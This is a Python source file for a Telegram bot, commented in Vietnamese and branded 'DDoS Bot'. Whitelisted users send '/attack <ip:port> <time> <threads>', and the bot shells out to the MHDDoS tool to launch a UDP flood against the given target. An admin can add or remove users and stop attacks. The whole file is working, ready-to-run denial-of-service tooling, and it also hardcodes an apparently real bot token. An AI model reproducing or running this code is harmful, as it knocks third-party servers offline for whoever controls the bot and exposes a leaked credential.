import asyncio
import os
import signal
import re
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = "7566533314:AAHaYpNzERykihJBDlt0N-Pzbf5cWLBmko0"
ADMIN_USER_ID = 6142730696  # Thay đổi thành ID Telegram của bạn
USERS_FILE = "users.txt"
attack_in_progress = False
attack_process = None  # Lưu trữ tiến trình tấn công

# Tải danh sách người dùng từ tệp
def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, "w") as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Chào mừng đến với DDoS Bot 🔥*\n"
        "*🔥 Sử dụng lệnh /attack <ip:port> <thời gian> <số luồng> để bắt đầu tấn công*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown")

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Bạn không có quyền!*", parse_mode="Markdown")
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*Cách dùng: /manage add|rem <user_id>*", parse_mode="Markdown")
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == "add":
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Đã thêm người dùng {target_user_id}.*", parse_mode="Markdown")
    elif command == "rem":
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Đã xóa người dùng {target_user_id}.*", parse_mode="Markdown")

async def run_attack(chat_id, ip, port, time, threads, context):
    global attack_in_progress, attack_process
    attack_in_progress = True

    try:
        attack_process = await asyncio.create_subprocess_shell(
            f"python3 /workspaces/MHDDOS-TG-BOT/MHDDoS/start.py UDP {ip}:{port} {threads} {time}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await attack_process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Lỗi: {str(e)}*", parse_mode="Markdown")

    finally:
        attack_in_progress = False
        attack_process = None
        await context.bot.send_message(chat_id=chat_id, text="*✅ Cuộc tấn công đã hoàn thành!*", parse_mode="Markdown")

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Bạn không có quyền!*", parse_mode="Markdown")
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Một cuộc tấn công khác đang diễn ra! Vui lòng chờ.*", parse_mode="Markdown")
        return

    if len(args) < 2 or len(args) > 3:
        await context.bot.send_message(chat_id=chat_id, text="*Cách dùng: /attack <ip:port> <thời gian> [số luồng]*", parse_mode="Markdown")
        return

    match = re.match(r"(\d+\.\d+\.\d+\.\d+):(\d+)", args[0])
    if not match:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Sai định dạng IP:Port. Ví dụ: 103.219.202.12:10016*", parse_mode="Markdown")
        return

    ip = match.group(1)
    port = match.group(2)
    time = args[1]
    threads = args[2] if len(args) == 3 else "1"  # Mặc định là 1 luồng

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Đang tấn công {ip}:{port} trong {time} giây với {threads} luồng!*", parse_mode="Markdown")

    asyncio.create_task(run_attack(chat_id, ip, port, time, threads, context))

async def stop(update: Update, context: CallbackContext):
    global attack_in_progress, attack_process

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if user_id != str(ADMIN_USER_ID):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Bạn không có quyền!*", parse_mode="Markdown")
        return

    if not attack_in_progress or attack_process is None:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Không có cuộc tấn công nào đang diễn ra!*", parse_mode="Markdown")
        return

    try:
        # Gửi tín hiệu SIGINT (CTRL+C)
        os.kill(attack_process.pid, signal.SIGINT)
        await asyncio.sleep(1)  # Chờ dừng hoàn toàn

        # Nếu tiến trình vẫn chạy, buộc dừng
        if attack_process.returncode is None:
            os.kill(attack_process.pid, signal.SIGKILL)

        attack_in_progress = False
        attack_process = None

        await context.bot.send_message(chat_id=chat_id, text="*✅ Đã dừng tấn công!*", parse_mode="Markdown")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Lỗi khi dừng tấn công: {str(e)}*", parse_mode="Markdown")

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("manage", manage))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stop", stop))
    application.run_polling()

if __name__ == "__main__":
    main()
